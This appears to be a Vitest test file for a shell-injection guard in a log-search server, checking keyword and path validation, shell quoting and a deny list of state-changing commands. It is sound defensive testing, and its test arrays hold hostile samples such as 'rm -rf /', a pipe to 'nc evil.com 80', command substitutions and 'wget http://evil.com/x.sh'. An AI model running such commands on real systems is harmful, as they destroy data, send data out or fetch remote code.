import { describe, expect, it } from "vitest";
import {
	validateKeyword,
	validateLogPath,
	shellQuote,
	assertNotForbidden
} from "../src/security/shellGuard.js";

describe("validateKeyword", () => {
	it("accepts typical log keywords", () => {
		expect(validateKeyword("searchShippingOrderSummary")).toBe("searchShippingOrderSummary");
		expect(validateKeyword("order-2026-08-13")).toBe("order-2026-08-13");
		expect(validateKeyword("com.example.ShippingService")).toBe("com.example.ShippingService");
		expect(validateKeyword("中文关键词")).toBe("中文关键词");
	});

	it("rejects shell metacharacter injection attempts", () => {
		const attacks = [
			"foo; rm -rf /",
			"foo && rm -rf /",
			"foo | nc evil.com 80",
			"foo`whoami`",
			"foo$(whoami)",
			"foo > /etc/passwd",
			"foo < secret",
			"foo\nrm -rf /",
			"foo\u0000bar"
		];
		for (const attack of attacks) {
			expect(() => validateKeyword(attack), `should reject: ${JSON.stringify(attack)}`).toThrow(
				/Invalid keyword/
			);
		}
	});

	it("rejects empty and overly long keywords", () => {
		expect(() => validateKeyword("")).toThrow(/Invalid keyword/);
		expect(() => validateKeyword("a".repeat(201))).toThrow(/Invalid keyword/);
	});
});

describe("validateLogPath", () => {
	it("accepts absolute POSIX log paths", () => {
		expect(validateLogPath("/data/logs/shipping")).toBe("/data/logs/shipping");
		expect(validateLogPath("/data/logs/app-2.log")).toBe("/data/logs/app-2.log");
	});

	it("rejects relative paths and metacharacters", () => {
		const bad = [
			"data/logs",
			"/data/logs; rm -rf /",
			"/data/logs`id`",
			"/data/logs$(id)",
			"/data/logs/*.log",
			"/data/logs\n/etc/passwd",
			"/data logs",
			""
		];
		for (const path of bad) {
			expect(() => validateLogPath(path), `should reject: ${JSON.stringify(path)}`).toThrow(
				/Invalid log path/
			);
		}
	});
});

describe("shellQuote", () => {
	it("wraps values in single quotes", () => {
		expect(shellQuote("hello")).toBe("'hello'");
	});

	it("escapes embedded single quotes", () => {
		expect(shellQuote("it's")).toBe("'it'\\''s'");
	});

	it("neutralizes injection payloads as literal strings", () => {
		const quoted = shellQuote("'; rm -rf / #");
		// 结果是一个带引号的单词：开头引号、转义的内部引号、结尾引号。
		expect(quoted.startsWith("'")).toBe(true);
		expect(quoted.endsWith("'")).toBe(true);
		expect(quoted).toBe("''\\''; rm -rf / #'");
	});
});

describe("assertNotForbidden", () => {
	it("allows read-only commands used by this server", () => {
		expect(() => assertNotForbidden("tail -n 100 /data/logs/app.log")).not.toThrow();
		expect(() => assertNotForbidden("grep -n -F -e 'kw' /data/logs/app.log")).not.toThrow();
	});

	it("rejects state-changing commands", () => {
		const forbidden = [
			"rm -rf /",
			"mv a b",
			"kill -9 1",
			"reboot",
			"shutdown -h now",
			"systemctl restart app",
			"docker restart app",
			"kubectl delete pod x",
			"wget http://evil.com/x.sh"
		];
		for (const command of forbidden) {
			expect(() => assertNotForbidden(command), `should reject: ${command}`).toThrow(
				/forbidden command/i
			);
		}
	});
});
